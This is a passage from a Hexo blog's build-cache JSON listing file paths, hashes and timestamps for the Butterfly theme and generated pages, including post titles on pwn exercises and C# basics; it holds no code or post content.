c1bdc0713cfe445","modified":1756215570643},{"_id":"themes/butterfly/layout/includes/head/pwa.pug","hash":"83ed05ef1e39f2ee70c3fba2cf96e488d8ffec66","modified":1756215570646},{"_id":"themes/butterfly/layout/includes/head/preconnect.pug","hash":"1e1a69aa2cbda2e621c741b3802093244b3cc04e","modified":1756215570645},{"_id":"themes/butterfly/layout/includes/head/google_adsense.pug","hash":"f29123e603cbbcc6ce277d4e8f600ba67498077c","modified":1756215570644},{"_id":"themes/butterfly/layout/includes/head/site_verification.pug","hash":"5168caadc4cf541f5d6676a9c5e8ae47a948f9ad","modified":1756215570647},{"_id":"themes/butterfly/.git/objects/pack/pack-6f091f6083e5b43abdcae3489510adced91950c1.rev","hash":"e42463417ace50eb8693d161052c1c6be9c70f68","modified":1756215570262},{"_id":"themes/butterfly/layout/includes/head/structured_data.pug","hash":"8ef72cd688999bf3915be6724c12700a1e2724d9","modified":1756215570647},{"_id":"themes/butterfly/layout/includes/loading/fullpage-loading.pug","hash":"d4d266eced4b9167bed86bcc5addc327f78cbdcc","modified":1756215570653},{"_id":"themes/butterfly/layout/includes/loading/index.pug","hash":"d76ce71ba106e350670c021a3dcae57547d01830","modified":1756215570653},{"_id":"themes/butterfly/layout/includes/loading/pace.pug","hash":"9d2d539555bab495959b9df734ed5c43a9f9e5a9","modified":1756215570654},{"_id":"themes/butterfly/layout/includes/header/menu_item.pug","hash":"733184f88e3a586a5fcc9d193ad500556b6c8eed","modified":1756215570649},{"_id":"themes/butterfly/layout/includes/header/post-info.pug","hash":"7d799c4694adb6e265e3f4b975d7f7f6a7021a17","modified":1756215570650},{"_id":"themes/butterfly/layout/includes/header/index.pug","hash":"44331c9db74b281b5c5c41439d3407a9076df1a1","modified":1756215570648},{"_id":"themes/butterfly/layout/includes/mixins/article-sort.pug","hash":"ef7afe0df7a3746744ac8185da7163b7406120ca","modified":1756215570654},{"_id":"themes/butterfly/layout/includes/header/nav.pug","hash":"f478a82ba4c15d4f6a5db38eca5c61f7054fa71d","modified":1756215570649},{"_id":"themes/butterfly/layout/includes/mixins/indexPostUI.pug","hash":"f3389fa9ae4fa32e3c16573286583bc3023e57ad","modified":1756215570655},{"_id":"themes/butterfly/layout/includes/page/404.pug","hash":"15d32c511e4875066fcbe9cb84c3ada07b5a7c41","modified":1756215570656},{"_id":"themes/butterfly/layout/includes/header/social.pug","hash":"e2d31e0f450ad42c47f7ee96375799342bf2f19b","modified":1756215570651},{"_id":"themes/butterfly/layout/includes/page/default-page.pug","hash":"efb40388e37cca0b5e7c3c66e811a42f8d32c910","modified":1756215570657},{"_id":"themes/butterfly/layout/includes/page/flink.pug","hash":"6b0fa5f048aca8e9cbe56978301af918cf7ac34a","modified":1756215570657},{"_id":"themes/butterfly/layout/includes/page/categories.pug","hash":"5276a8d2835e05bd535fedc9f593a0ce8c3e8437","modified":1756215570656},{"_id":"themes/butterfly/layout/includes/page/shuoshuo.pug","hash":"b2423cfc57a5e3a0e1112ff7c18d5c5c720d89d5","modified":1756215570658},{"_id":"themes/butterfly/layout/includes/post/post-copyright.pug","hash":"b96c232e5178d927987791d9ae386dd83679535a","modified":1756215570660},{"_id":"themes/butterfly/layout/includes/post/outdate-notice.pug","hash":"b7ce9484bc5c97ea6154f0b78fb9b8951fafedbd","modified":1756215570660},{"_id":"themes/butterfly/layout/includes/third-party/aplayer.pug","hash":"ed79fef5b5025415ea12eaed970f3fe7f6ef9596","modified":1756215570665},{"_id":"themes/butterfly/layout/includes/page/tags.pug","hash":"79ad31eb72a9e14007770b18a426406a25315b38","modified":1756215570658},{"_id":"themes/butterfly/layout/includes/post/reward.pug","hash":"db92f25ff3fd061882f81bf74ca560ff66983a0c","modified":1756215570661},{"_id":"themes/butterfly/layout/includes/third-party/effect.pug","hash":"43014bfc63583d3ee8808d526dd165848c0ed52f","modified":1756215570683},{"_id":"themes/butterfly/layout/includes/third-party/pjax.pug","hash":"d29ee6a07e6716c0dc1d4533c87b19b6076fefd3","modified":1756215570694},{"_id":"themes/butterfly/layout/includes/widget/card_ad.pug","hash":"a8312b527493dabbadbb1280760168d3bc909a3b","modified":1756215570701},{"_id":"themes/butterfly/layout/includes/third-party/prismjs.pug","hash":"88f979a0b1a19eeb0db229247833bf9c6865c3b9","modified":1756215570694},{"_id":"themes/butterfly/layout/includes/third-party/subtitle.pug","hash":"236c3ce26dd76e80b04d457789475c42da5ac0c8","modified":1756215570699},{"_id":"themes/butterfly/layout/includes/widget/card_announcement.pug","hash":"21e019bdc3b1e796bb00976bb29af2d51f873624","modified":1756215570701},{"_id":"themes/butterfly/layout/includes/third-party/umami_analytics.pug","hash":"bc35a1552d26ecdeeadbf06300078dbb5128a6e5","modified":1756215570700},{"_id":"themes/butterfly/layout/includes/widget/card_archives.pug","hash":"73d33b6930e7944187a4b3403daf25d27077a2dd","modified":1756215570702},{"_id":"themes/butterfly/layout/includes/widget/card_author.pug","hash":"1aba8aa7cd767dc96879d13a13b4c8ceb9023233","modified":1756215570702},{"_id":"themes/butterfly/layout/includes/widget/card_newest_comment.pug","hash":"d8753772889b5d0f4d15639ed6af5e91e53b1d03","modified":1756215570704},{"_id":"themes/butterfly/layout/includes/widget/card_categories.pug","hash":"66e383b4ef374951eb87dd1bf4cdb7a667193fb5","modified":1756215570704},{"_id":"themes/butterfly/layout/includes/widget/card_post_series.pug","hash":"e0bb72fa0ce15964b11b8fe421cae3432394e35f","modified":1756215570705},{"_id":"themes/butterfly/layout/includes/widget/card_post_toc.pug","hash":"1dd19a564320d248dbcee7f118a5b96c6466da65","modified":1756215570706},{"_id":"themes/butterfly/layout/includes/widget/index.pug","hash":"45f620cd87b9ef2aa9d1e024e697ed6b4eecff34","modified":1756215570709},{"_id":"themes/butterfly/layout/includes/widget/card_recent_post.pug","hash":"bb842d2aa6469d65bf06af1372f0a19a9e4ef44c","modified":1756215570706},{"_id":"themes/butterfly/layout/includes/widget/card_top_self.pug","hash":"7b5ae404a1205546b7de4be42291315cf918f2b3","modified":1756215570707},{"_id":"themes/butterfly/source/css/_highlight/highlight.styl","hash":"67062d597408068e4a59e95851e98fed34b745da","modified":1756215570737},{"_id":"themes/butterfly/layout/includes/widget/card_webinfo.pug","hash":"fcddd80cdeb6aa81f342cd9f0102302f6ba087a8","modified":1756215570708},{"_id":"themes/butterfly/layout/includes/widget/card_tags.pug","hash":"842b772a387b576550fa127030e1c2e9bf65716d","modified":1756215570707},{"_id":"themes/butterfly/source/css/_highlight/theme.styl","hash":"a51edfd3e499e7d38c32241c40e8e4d371efca73","modified":1756215570742},{"_id":"themes/butterfly/source/css/_global/function.styl","hash":"209b8c04b88cf21f732ddb8bf23dbeaf2038ea1e","modified":1756215570736},{"_id":"themes/butterfly/source/css/_global/index.styl","hash":"97c3c3bc0272fd8483760a0efdcd2fd4ceed8a08","modified":1756215570736},{"_id":"themes/butterfly/source/css/_layout/chat.styl","hash":"4cc02bcbaa4a1933a82a9ea57a603fe2d059fc77","modified":1756215570743},{"_id":"themes/butterfly/source/css/_layout/aside.styl","hash":"865fafbb12b83861b3fff572bacf053fe4eb6c07","modified":1756215570743},{"_id":"themes/butterfly/source/css/_layout/comments.styl","hash":"fbfce4d67cacd1df22fb73d89d008693f59d9d91","modified":1756215570744},{"_id":"themes/butterfly/source/css/_layout/loading.styl","hash":"f0b01bbf321c2c24fdccaee367dd9fd448031a72","modified":1756215570745},{"_id":"themes/butterfly/source/css/_layout/footer.styl","hash":"5692bcf8929f7ef12b10d860da6cb90ca55752c0","modified":1756215570744},{"_id":"themes/butterfly/layout/includes/widget/card_bottom_self.pug","hash":"1dba77d250eeebfb6e293d504352c7e9ea31980b","modified":1756215570703},{"_id":"themes/butterfly/source/css/_layout/head.styl","hash":"7536c44e78115559a996d0384adec38b78d8dc25","modified":1756215570744},{"_id":"themes/butterfly/source/css/_layout/pagination.styl","hash":"7d7554573c005399bc8c2264a85896d2d51be1e1","modified":1756215570746},{"_id":"themes/butterfly/source/css/_layout/post.styl","hash":"543eaf9c7df7e0db841e5946ee5f9082c3c46290","modified":1756215570747},{"_id":"themes/butterfly/source/css/_layout/relatedposts.styl","hash":"ef8e8549fe7ad4b99793844a93b4a89f77f417d5","modified":1756215570747},{"_id":"themes/butterfly/source/css/_mode/darkmode.styl","hash":"4c9849df9c68d892c7df0ca28123aeb0dc9dc424","modified":1756215570750},{"_id":"themes/butterfly/source/css/_layout/rightside.styl","hash":"a0f5835f04358122e8b1d38dd3e8da09a1b5b431","modified":1756215570748},{"_id":"themes/butterfly/source/css/_layout/reward.styl","hash":"d9cdf564a822a585e67fd5bac8573ba87eeb3743","modified":1756215570748},{"_id":"themes/butterfly/source/css/_layout/third-party.styl","hash":"0af7c8754f04bdd9a02a14d880774753bd2e35ee","modified":1756215570749},{"_id":"themes/butterfly/source/css/_layout/sidebar.styl","hash":"084dc4dfb41f55e237a9d6cf8c2f5dba729b83be","modified":1756215570749},{"_id":"themes/butterfly/source/css/_page/categories.styl","hash":"c4cda7b0c99015df29ce00fdfddd2f7679653754","modified":1756215570753},{"_id":"themes/butterfly/source/css/_mode/readmode.styl","hash":"ad66212554468b7067590308ed4cf40524fea662","modified":1756215570751},{"_id":"themes/butterfly/source/css/_page/404.styl","hash":"205ccc7d0ec6ce1193b46bc0c9ce0385594581fb","modified":1756215570752},{"_id":"themes/butterfly/source/css/_page/archives.styl","hash":"5abe5480d83ff8b452a780a484d50a44091475bf","modified":1756215570752},{"_id":"themes/butterfly/source/css/_page/homepage.styl","hash":"fc26e980fedde31644ebf878967f66ef9ba32be2","modified":1756215570754},{"_id":"themes/butterfly/source/css/_page/flink.styl","hash":"1f8d715faf3b91b53426e38195c0920afb3bfa1c","modified":1756215570754},{"_id":"themes/butterfly/source/css/_page/common.styl","hash":"dcff804c4c237e1e908481b44c1ac4e39ac0da34","modified":1756215570753},{"_id":"themes/butterfly/source/css/_page/tags.styl","hash":"7543bb688876a946538d66b991c71b94b5216277","modified":1756215570757},{"_id":"themes/butterfly/source/css/_search/index.styl","hash":"6c4cbdadd9a49029fe0c59e29808d873e5b6b6ee","modified":1756215570758},{"_id":"themes/butterfly/source/css/_page/shuoshuo.styl","hash":"79bb1d9a27822ed5675d1e52f5dbd0e2f5d5010a","modified":1756215570756},{"_id":"themes/butterfly/source/css/_tags/button.styl","hash":"de8437a058a315d14d7e7034066f095b7b3ed4b4","modified":1756215570760},{"_id":"themes/butterfly/source/css/_tags/gallery.styl","hash":"30d1f809efd252ed0233d96d4374efd2b01d2292","modified":1756215570760},{"_id":"themes/butterfly/source/css/_tags/hexo.styl","hash":"985b183db7b7bfd8f9bdb60494549fb7f850348b","modified":1756215570761},{"_id":"themes/butterfly/source/css/_tags/hide.styl","hash":"d27dbccaf3de1c9158d19e4fd49a25953cb5778d","modified":1756215570761},{"_id":"themes/butterfly/source/css/_tags/inlineImg.styl","hash":"3be8d0a75e7cc96548667cae0cb6a474279bd0b5","modified":1756215570762},{"_id":"themes/butterfly/source/css/_search/local-search.styl","hash":"1f2b86df86df81c3a59377b29102314ffc73dfa6","modified":1756215570759},{"_id":"themes/butterfly/source/css/_tags/label.styl","hash":"216f52fefc2274b542b549d8470503e6f1a308fb","modified":1756215570762},{"_id":"themes/butterfly/source/css/_tags/note.styl","hash":"4929382bd60788d34752a66e2fe764ef797a72a0","modified":1756215570763},{"_id":"themes/butterfly/source/css/_tags/series.styl","hash":"0657169849bc4bf4d93b5492ade040c8f58c1901","modified":1756215570764},{"_id":"themes/butterfly/source/css/_search/algolia.styl","hash":"d8a8275a68a1421c4c09b604cf78bea16c1d0463","modified":1756215570758},{"_id":"themes/butterfly/source/css/_tags/tabs.styl","hash":"3a88eedcb694da79e92581ce50cb1a430b1fb615","modified":1756215570764},{"_id":"themes/butterfly/layout/includes/third-party/abcjs/index.pug","hash":"f0a90d8e39915a74b16ef22e851f179415cd7eaa","modified":1756215570663},{"_id":"themes/butterfly/source/css/_tags/timeline.styl","hash":"e846ddaef494d46cdfa2379deacfe74fa1cc5264","modified":1756215570765},{"_id":"themes/butterfly/.git/logs/refs/heads/master","hash":"0be0a0c9f3529b36cc4c37d26461e71ccfdd4514","modified":1756215570607},{"_id":"themes/butterfly/source/css/_third-party/normalize.min.css","hash":"8549829fb7d3c21cd9e119884962e8c463a4a267","modified":1756215570766},{"_id":"themes/butterfly/.git/refs/remotes/origin/HEAD","hash":"d9427cda09aba1cdde5c69c2b13c905bddb0bc51","modified":1756215570592},{"_id":"themes/butterfly/layout/includes/third-party/abcjs/abcjs.pug","hash":"7df4d27cf9e576c6b9c1e4f76a100a41749ca8bb","modified":1756215570663},{"_id":"themes/butterfly/layout/includes/third-party/card-post-count/index.pug","hash":"846cabae287ae31b3bbfac3da022475713dd5ecc","modified":1756215570668},{"_id":"themes/butterfly/layout/includes/third-party/card-post-count/artalk.pug","hash":"b03ee8625149191f9d5d057bbc9824b68d8dd0c4","modified":1756215570666},{"_id":"themes/butterfly/layout/includes/third-party/card-post-count/disqus.pug","hash":"d6fff5a7f84c8b09f282f9ddc0020a68a8aac9ea","modified":1756215570667},{"_id":"themes/butterfly/layout/includes/third-party/card-post-count/fb.pug","hash":"cbfbcf34a24d21ba2b21cf9eedb76f4c3c563c5a","modified":1756215570667},{"_id":"themes/butterfly/layout/includes/third-party/card-post-count/remark42.pug","hash":"716dc463fe4ef5112e7018ed60804125fdfa5cad","modified":1756215570668},{"_id":"themes/butterfly/source/js/search/algolia.js","hash":"7119f2f2943de71999d3dd6ba5c60cde846f114b","modified":1756215570774},{"_id":"themes/butterfly/layout/includes/third-party/card-post-count/twikoo.pug","hash":"be45b522286bbc64724341f23a5056ad24d3f796","modified":1756215570669},{"_id":"themes/butterfly/source/js/search/local-search.js","hash":"a2b783230a9143de69004cfc914d9f55e6fc1660","modified":1756215570775},{"_id":"themes/butterfly/layout/includes/third-party/card-post-count/waline.pug","hash":"fd2320ee25507bb8ef49f932c2d170586b44ea4d","modified":1756215570670},{"_id":"themes/butterfly/layout/includes/third-party/chat/chatra.pug","hash":"5b29badecbbe828112c001156023fc0566045cf6","modified":1756215570671},{"_id":"themes/butterfly/layout/includes/third-party/card-post-count/valine.pug","hash":"7884883ec15792f7e54daacb3c62b851dde2b66a","modified":1756215570670},{"_id":"themes/butterfly/layout/includes/third-party/comments/artalk.pug","hash":"89c63a5f0c0ab6314de7158fbc8fcbc84997fc55","modified":1756215570673},{"_id":"themes/butterfly/layout/includes/third-party/chat/crisp.pug","hash":"24d094fd917947c0ca7492fa094328b1a183b873","modified":1756215570672},{"_id":"themes/butterfly/layout/includes/third-party/comments/disqus.pug","hash":"f2ea5249b3e6670f6c8c77868f4f42c502e43830","modified":1756215570675},{"_id":"themes/butterfly/layout/includes/third-party/chat/index.pug","hash":"e8438941085def0591a72fc9b0d705dbf107f54f","modified":1756215570672},{"_id":"themes/butterfly/layout/includes/third-party/chat/tidio.pug","hash":"62466b251052cae609b6369d4cb4b6a85320757d","modified":1756215570673},{"_id":"themes/butterfly/layout/includes/third-party/comments/giscus.pug","hash":"592b2251db6c1abeb8b0eebe3b2e6d9aa0dec445","modified":1756215570676},{"_id":"themes/butterfly/layout/includes/third-party/comments/facebook_comments.pug","hash":"8af585e6d6f73ee57114eefad574dc6e8ea9f570","modified":1756215570676},{"_id":"themes/butterfly/layout/includes/third-party/comments/index.pug","hash":"332b532bafbaf369fde840883b77e5a23d050a39","modified":1756215570678},{"_id":"themes/butterfly/layout/includes/third-party/comments/disqusjs.pug","hash":"c81fa7d8a5cb96d1ae07bfa8c46b84a58161add1","modified":1756215570675},{"_id":"themes/butterfly/layout/includes/third-party/comments/gitalk.pug","hash":"58914c58a190e3bc0aa37cb581e77e442b563501","modified":1756215570677},{"_id":"themes/butterfly/layout/includes/third-party/comments/js.pug","hash":"3abbaaa4ea575c45b3cebffd40bad1acc6ffce84","modified":1756215570678},{"_id":"themes/butterfly/layout/includes/third-party/comments/remark42.pug","hash":"ea9766439b6b1936306916a8b08d2681afbc8ea9","modified":1756215570680},{"_id":"themes/butterfly/layout/includes/third-party/comments/livere.pug","hash":"9d84a681289175dec75a85f301d2fc9ce1b2bb7a","modified":1756215570679},{"_id":"themes/butterfly/layout/includes/third-party/comments/twikoo.pug","hash":"53d99831f29aeb2e336ed1407d79590041f77002","modified":1756215570680},{"_id":"themes/butterfly/layout/includes/third-party/comments/utterances.pug","hash":"30a7d157890de69deab28baa47fb7bb28b040efd","modified":1756215570681},{"_id":"themes/butterfly/layout/includes/third-party/comments/valine.pug","hash":"24f18b0c67803210d53abbf9c1d454c000b06eee","modified":1756215570681},{"_id":"themes/butterfly/layout/includes/third-party/math/chartjs.pug","hash":"732eb1118ea1a73aa5c164d639097c614f8e9953","modified":1756215570684},{"_id":"themes/butterfly/layout/includes/third-party/math/index.pug","hash":"af66d13204030d47537b9e31a6173e63589ce7ff","modified":1756215570684},{"_id":"themes/butterfly/layout/includes/third-party/newest-comments/artalk.pug","hash":"187302dbc916852ff2fdf47061e272c061611dda","modified":1756215570687},{"_id":"themes/butterfly/layout/includes/third-party/comments/waline.pug","hash":"e2bf15357485cd502414b3b20f5b1f762a2fd014","modified":1756215570682},{"_id":"themes/butterfly/layout/includes/third-party/math/katex.pug","hash":"b83db9fa64d42a0bfd97efb660e09be3f166a144","modified":1756215570685},{"_id":"themes/butterfly/layout/includes/third-party/math/mathjax.pug","hash":"db2f4fff80a1166476ea76ae004aa186df11bad3","modified":1756215570686},{"_id":"themes/butterfly/layout/includes/third-party/newest-comments/common.pug","hash":"27fa75affebc6e84a487c62bceff783bde595256","modified":1756215570688},{"_id":"themes/butterfly/layout/includes/third-party/newest-comments/disqus-comment.pug","hash":"fa4b4194749d05f7249f365f2b89c0281057ce54","modified":1756215570689},{"_id":"themes/butterfly/layout/includes/third-party/newest-comments/index.pug","hash":"a7c07dbc1e970a5b247091458e1ee9b144a3366d","modified":1756215570690},{"_id":"themes/butterfly/layout/includes/third-party/newest-comments/github-issues.pug","hash":"72e2970b23570e308f8af5d8ba8e5e3321d01bbf","modified":1756215570689},{"_id":"themes/butterfly/layout/includes/third-party/math/mermaid.pug","hash":"ca2fc5928ca292f29fd8333c73733344994096fb","modified":1756215570686},{"_id":"themes/butterfly/layout/includes/third-party/newest-comments/remark42.pug","hash":"34edfebf0cace0852806be774910ccb0e0914650","modified":1756215570690},{"_id":"themes/butterfly/layout/includes/third-party/newest-comments/twikoo-comment.pug","hash":"d2e12a9fc302a4efe52c90d44896fbd73e193a1f","modified":1756215570691},{"_id":"themes/butterfly/layout/includes/third-party/search/algolia.pug","hash":"7f0ede1cd3fed2669c94a8e1b21bc0b183f310b8","modified":1756215570695},{"_id":"themes/butterfly/layout/includes/third-party/newest-comments/valine.pug","hash":"d376ec17fb19fcdcf0d2ad71330190146d3af879","modified":1756215570692},{"_id":"themes/butterfly/layout/includes/third-party/search/docsearch.pug","hash":"013756ff3363344987cc00fc9bd833baf193c341","modified":1756215570695},{"_id":"themes/butterfly/layout/includes/third-party/newest-comments/waline.pug","hash":"ec6c685080634ac46ffbea1b8f10313388888f43","modified":1756215570693},{"_id":"themes/butterfly/layout/includes/third-party/search/index.pug","hash":"f8557548d2ad8dd149c562193991c6c6cda02415","modified":1756215570696},{"_id":"themes/butterfly/source/css/_highlight/highlight/diff.styl","hash":"9f02598b5e4296aec6470639d4bac4c9ac46392e","modified":1756215570738},{"_id":"themes/butterfly/layout/includes/third-party/share/index.pug","hash":"e51e896ccb13900de38dc81cf44dc789e2418a12","modified":1756215570698},{"_id":"themes/butterfly/layout/includes/third-party/search/local-search.pug","hash":"2622b4cf9189fa23e4a422aaf9ef272e4f2c6137","modified":1756215570696},{"_id":"themes/butterfly/layout/includes/third-party/share/addtoany.pug","hash":"5c944052280c5ed046d2cfeb54b0da8876af0ec6","modified":1756215570697},{"_id":"themes/butterfly/layout/includes/third-party/share/share-js.pug","hash":"efef352c1d122409575386bf3894dce8e87032e2","modified":1756215570698},{"_id":"themes/butterfly/.git/logs/refs/remotes/origin/HEAD","hash":"0be0a0c9f3529b36cc4c37d26461e71ccfdd4514","modified":1756215570596},{"_id":"themes/butterfly/source/css/_highlight/highlight/index.styl","hash":"ef52ebf1e8e751a412f9456fdaeee7d88afd9a72","modified":1756215570738},{"_id":"themes/butterfly/source/css/_highlight/prismjs/index.styl","hash":"1883c91d43bff10aae55122a21e0b064b6f5c9dd","modified":1756215570741},{"_id":"themes/butterfly/source/css/_highlight/prismjs/diff.styl","hash":"077ec530831be1d80e93da380406b9f5abd0918a","modified":1756215570739},{"_id":"themes/butterfly/source/css/_highlight/prismjs/line-number.styl","hash":"de4bb5fc2dfca368b35e4c1109c92f7abc9e2245","modified":1756215570741},{"_id":"themes/butterfly/source/img/logo.png","hash":"646a4d7ec80122da98c48afc90d2508533dc15f1","modified":1753594823406},{"_id":"themes/butterfly/.git/objects/pack/pack-6f091f6083e5b43abdcae3489510adced91950c1.idx","hash":"aba99b6d85effe3dec99f15ef083634e95414e07","modified":1756215570257},{"_id":"themes/butterfly/source/img/butterfly-icon.png","hash":"f5dd732fed5c3bcd4aa76bac3441bac8485fb432","modified":1756215570770},{"_id":"themes/butterfly/.git/objects/pack/pack-6f091f6083e5b43abdcae3489510adced91950c1.pack","hash":"f27baf9da3841ee6ec95b5c120af9230903364c5","modified":1756215570254},{"_id":"public/about/index.html","hash":"bcc754a561d1168177baa05d089f5822e4added4","modified":1762523694606},{"_id":"public/link/index.html","hash":"3cb5a5efbfcdf312b93021658a6529930b9975fb","modified":1762523694606},{"_id":"public/tags/index.html","hash":"f8588d62cdab16e359ba4439d33f5bafd39682cf","modified":1762523694606},{"_id":"public/music/index.html","hash":"c65f850227bd460d8104c8d9c83c53fb784750f0","modified":1762523694606},{"_id":"public/categories/index.html","hash":"f57aa0875a8c08baf0a831385f54d735a02a19aa","modified":1762523694606},{"_id":"public/2025/08/26/hello-world/index.html","hash":"b2dc583cd2cca9ae3d3e088d0d151a97e9f5701f","modified":1756789237754},{"_id":"public/2025/08/27/Day 01 pwn环境配置/index.html","hash":"6b20905396b5b10370cd3861c4a1bf350d69a36c","modified":1756789237754},{"_id":"public/archives/index.html","hash":"d3e2362cdd67953812358a764081fa25c61e38d4","modified":1762523694606},{"_id":"public/2025/08/28/Day 02 程序保护机制及绕过思路/index.html","hash":"d01cd3d57f011b2c3ea9ea9c89f92e2a1a9cc68e","modified":1756789237754},{"_id":"public/archives/2025/08/index.html","hash":"5508863b5d80205ee14b2b97ceae4933f831a0c3","modified":1762523694606},{"_id":"public/archives/2025/index.html","hash":"cdcf8e08884a81fbd511afaacc7b116e2444f454","modified":1762523694606},{"_id":"public/tags/ubuntu/index.html","hash":"efa46f7ca7c5aacd7878d94de213a84164bf3a74","modified":1762523694606},{"_id":"public/index.html","hash":"97b9e4ed80902ba0d3e6a7fb0dbdf9fea7164a85","modified":1762523694606},{"_id":"public/tags/pwndbg/index.html","hash":"9ef247f061653842bf5a263e13f7869284f25d71","modified":1762523694606},{"_id":"public/tags/pwntools/index.html","hash":"a5f8c12bd32216ee8742ed187856f3e25a6ceeaa","modified":1762523694606},{"_id":"public/categories/pwn/index.html","hash":"11c071daa0595c2292105637dd6721177f2fa113","modified":1762523694606},{"_id":"public/tags/python/index.html","hash":"954910e1c3b20587000341c0b4290ed5ef75dce8","modified":1762523694606},{"_id":"public/img/error-page.png","hash":"d2519710498a871ca3e913c57e2ba20a805b6430","modified":1756349868084},{"_id":"public/img/404.jpg","hash":"fb4489bc1d30c93d28f7332158c1c6c1416148de","modified":1756349868084},{"_id":"public/img/favicon.ico","hash":"455ac256580bf31a45813dbbdb87219bfc8bfb04","modified":1756349868084},{"_id":"public/img/friend_404.gif","hash":"8d2d0ebef70a8eb07329f57e645889b0e420fa48","modified":1756349868084},{"_id":"public/css/var.css","hash":"da39a3ee5e6b4b0d3255bfef95601890afd80709","modified":1756349868084},{"_id":"public/css/index.css","hash":"7d0a78942c210b91755d20f72abb93406745fa75","modified":1756349868084},{"_id":"public/js/tw_cn.js","hash":"7ef59df188ea523da89f4caf69c5c0f14e78da69","modified":1756349868084},{"_id":"public/js/main.js","hash":"fb746a3e67d0373deea8481110dd436fea4ca38c","modified":1756349868084},{"_id":"public/js/search/algolia.js","hash":"e5821f78381af9f0f646952a7dd118daab2a79a6","modified":1756349868084},{"_id":"public/js/utils.js","hash":"ce898acc9081131cdc3a97baf43cb7b1a25da47f","modified":1756349868084},{"_id":"public/img/logo.png","hash":"646a4d7ec80122da98c48afc90d2508533dc15f1","modified":1756349868084},{"_id":"public/js/search/local-search.js","hash":"4e11d033fb58563f5e1b497f1a6f1c62d3501ee6","modified":1756349868084},{"_id":"public/img/butterfly-icon.png","hash":"f5dd732fed5c3bcd4aa76bac3441bac8485fb432","modified":1756349868084},{"_id":"source/_posts/Day 03 shellcode之：板子做pwn,易如反掌.md","hash":"1e5a2534afb7cb0d971e226cc12337786af51ce9","modified":1758521621825},{"_id":"public/2025/08/29/Day 03 shellcode之：板子做pwn,易如反掌/index.html","hash":"83f46a04ecc780bd6c097b2da296fa81a3bc6df6","modified":1756789237754},{"_id":"source/_posts/Day 04 shellcode之手写汇编小tips.md","hash":"8ab1256c96e5b9a2941c3107dbd20192a1f40952","modified":1758521757089},{"_id":"public/2025/08/30/Day 04 shellcode之手写汇编小tips/index.html","hash":"4bd3cd6d26baf5508cfc0a085055105d69f189ed","modified":1756789237754},{"_id":"public/tags/汇编/index.html","hash":"788550719e91639a96742f4926e56d6a8e10e363","modified":1762523694606},{"_id":"source/_posts/Day 05 格式化字符串漏洞.md","hash":"59f6a74ea32e01ffa5bacfd62b7f8315ce96ddbe","modified":1758521898925},{"_id":"public/2025/08/31/Day 05 格式化字符串漏洞/index.html","hash":"f0d2a9cbfefc6f0d2e9f1336582f5b5d4eef396d","modified":1756789237754},{"_id":"public/tags/format-string/index.html","hash":"23e70e382a091db051c2ecb922fd2f7e4aba0613","modified":1762523694606},{"_id":"source/_posts/Day 01 C#基础语法.md","hash":"34ba1dd18efcb2f01b039bc61ae52de5f08ba5b6","modified":1756789080402},{"_id":"public/2025/09/02/Day 01 C#基础语法/index.html","hash":"395ae9f194878dafdaae29c1d2e446bf44765da8","modified":1756789237754},{"_id":"public/archives/2025/09/index.html","hash":"a22699537c4fa67262517dc619426969e508c1cb","modified":1762523694606},{"_id":"public/categories/C/index.html","hash":"1cfd003fb83a71859ad65b9fb7a590235a5b2215","modified":1756963051213},{"_id":"public/tags/语法糖/index.html","hash":"68ed2c1419becd4d026f7de189718429aef359c7","modified":1762523694606},{"_id":"public/2025/08/26/hello-world.html","hash":"a1d0ae6892bf41b8343fb55572a9c1c0621145fe","modified":1758518456363},{"_id":"public/2025/08/28/Day 02 程序保护机制及绕过思路.html","hash":"a6cae037250cf54685ec9e2ccedb5e79fe71d7e6","modified":1762523499822},{"_id":"public/2025/08/27/Day 01 pwn环境配置.html","hash":"ece622d3136ad9ae291afb15d4c332dc73500bf7","modified":1762523499822},{"_id":"public/2025/08/29/Day 03 shellcode之：板子做pwn,易如反掌.html","hash":"63e3aacb77d3c8cd024d93e1a77074cbe949d7c2","modified":1762523499822},{"_id":"public/2025/08/30/Day 04 shellcode之手写汇编小tips.html","hash":"e507b4d9b6938a772472ea9c559062647606945b","modified":1762523499822},{"_id":"public/2025/08/31/Day 05 格式化字符串漏洞.html","hash":"3b329e5297855e90db789b2fef0a7c9e15fd8d1f","modified":1762523499822},{"_id":"public/2025/09/02/Day 01 C#基础语法.html","hash":"a6039b0e660cd4abaf0adbdedc855f2ec0f5e674","modified":1756789977876},{"_id":"source/_posts/Day 01 'C#'基础语法.md","hash":"34ba1dd18efcb2f01b039bc61ae52de5f08ba5b6","modified":1756790649151},{"_id":"public/2025/09/02/Day 01 'C#'基础语法.html","hash":"0b98b3096bebe3bfca243d7d9f766a8afc28323f","modified":1756790660113},{"_id":"source/_posts/Day 01 Csharp基础语法.md","hash":"409af160528c4383ebf2baa0b3ab81fc3991e53e","modified":1758521171470},{"_id":"public/2025/09/02/Day 01 Csharp基础语法.html","hash":"48a17cd4d856f4fdade9fe559627b5bf17076fa8","modified":1762523499822},{"_id":"public/categories/Csharp/index.html","hash":"097e77e59de98bab3465b8767a2547ff88455034","modified":1762523694606},{"_id":"source/_posts/Day 02 LINQ的基础用法.md","hash":"4674ea4ceba12b38efff8b04381410e6a949edf6","modified":1758522107907},{"_id":"public/2025/09/04/Day 02 LINQ的基础用法.html","hash":"a3d90f813e127c9f3eceed12d6229492b4c4a451","modified":1758522840276},{"_id":"public/tags/LINQ/index.html","hash":"e648fdb789c91474766f64f8c487131e3bd70c15","modified":1762523694606},{"_id":"source/images/C#.png","hash":"1173828d229ab714d2d4c4b5446afe32d6603012","modified":1756792120221},{"_id":"source/images/bk.jpg","hash":"d079602632283b89c3f5f1f021c58cb59f702ce8","modified":1756286403866},{"_id":"source/images/pwn.jpg","hash":"3efc1b71127f0e908d73cdd79ddf6f234034b90b","modified":1756288683723},{"_id":"source/images/bl.jpg","hash":"bb978f394e8e3847123b1a67e25d8d63b254924d","modified":1756286383899},{"_id":"source/images/facial.jpg","hash":"f4c70a34b1735fe84348207d0f845978c7a36913","modified":1756187181457},{"_id":"source/images/friendsimg.jpg","hash":"94cc0cf8765fa6bb7d15b4b5b1e7943a9043028f","modified":1756284225842},{"_id":"source/images/桌面.jpg","hash":"fa43ac3b643240d038fc1bd7d3bc7b3b99bc7af9","modified":1737122506198},{"_id":"source/images/00.png","hash":"dcf0a38bece75e3b8097b65d040e06d490c47894","modified":1756349093316},{"_id":"source/images/see.png","hash":"0357284fd03ee96ea16dbe2cd5b6b399eae7845a","modified":1731514578822},{"_id":"public/images/bk.jpg","hash":"d079602632283b89c3f5